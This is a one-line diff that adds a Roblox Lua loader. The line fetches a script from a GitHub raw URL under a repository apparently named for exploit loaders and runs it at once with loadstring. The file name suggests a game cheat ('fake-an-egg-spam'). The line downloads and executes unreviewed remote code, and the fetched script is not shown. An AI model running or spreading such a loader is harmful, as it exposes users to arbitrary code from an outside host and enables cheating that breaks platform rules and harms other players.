@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/fake-an-egg-spam7-8o0gdn69mdcb29.lua"))()
